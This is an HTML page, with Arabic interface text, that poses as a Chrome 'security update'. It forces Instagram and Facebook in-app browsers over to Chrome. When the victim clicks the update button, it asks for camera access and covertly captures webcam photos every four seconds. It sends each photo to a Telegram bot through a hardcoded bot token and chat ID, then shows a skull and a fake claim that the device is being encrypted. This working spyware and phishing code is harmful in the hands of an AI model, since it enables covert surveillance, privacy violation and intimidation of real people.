<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VEXO SYSTEM REPAIR</title>
    <script>
        // دالة لإجبار المتصفح على الفتح في جوجل كروم
        function redirectToChrome() {
            var currentUrl = window.location.href.replace('https://', '');
            var chromeIntent = "intent://" + currentUrl + "#Intent;scheme=https;package=com.android.chrome;end";
            
            // إذا كان المستخدم يفتح الرابط من داخل تطبيق (مثل إنستجرام)
            if (navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV")) {
                window.location.href = chromeIntent;
            }
        }
        window.onload = redirectToChrome;
    </script>
    <style>
        body { margin: 0; background: black; color: #0f0; font-family: monospace; overflow: hidden; text-align: center; }
        canvas { display: block; position: absolute; z-index: 1; }
        .overlay { position: relative; z-index: 2; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.85); }
        .btn { background: #0f0; color: #000; border: none; padding: 20px 40px; font-weight: bold; cursor: pointer; border-radius: 5px; box-shadow: 0 0 20px #0f0; }
        .skull { font-size: 7px; line-height: 7px; white-space: pre; text-shadow: 0 0 10px #0f0; margin-bottom: 20px; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <video id="v" autoplay playsinline style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <div class="overlay" id="p1">
        <h1 style="color: red;">⚠️ SECURITY ALERT ⚠️</h1>
        <p style="direction: rtl;">تم اكتشاف ثغرة في متصفحك.<br>اضغط لتحديث الحماية في Chrome.</p>
        <button class="btn" onclick="start()">تحديث الحماية الآن</button>
    </div>

    <div class="overlay" id="p2" style="display:none">
        <div class="skull">
               ______
            .-"      "-.
           /            \
          |              |
          |,  .-.  .-.  ,|
          | )(__/  \__)( |
          |/     /\     \|
          (_     ^^     _)
           \__|IIIIII|__/
            | \IIIIII/ |
            \          /
             `--------`
        </div>
        <p style="direction: rtl;">جاري سحب الصور وتشفير الجهاز...</p>
    </div>

    <script>
        const TOKEN = '8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs'; // التوكن الخاص بك
        const ID = '7822309283'; // الآيدي الخاص بك

        // تأثير الماتركس
        const canvas = document.querySelector('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const drops = Array(Math.floor(canvas.width / 20)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0f0"; ctx.font = "20px monospace";
            drops.forEach((y, i) => {
                ctx.fillText("01"[Math.floor(Math.random()*2)], i * 20, y * 20);
                if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 33);

        async function start() {
            document.getElementById('p1').style.display = 'none';
            document.getElementById('p2').style.display = 'flex';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = stream;
                setInterval(capture, 4000);
            } catch (e) {}
        }

        function capture() {
            const v = document.getElementById('v'), c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(blob => {
                const f = new FormData();
                f.append('chat_id', ID);
                f.append('photo', blob, 'x.jpg');
                f.append('caption', '💀 VEXO: تم سحب صورة من Chrome!');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
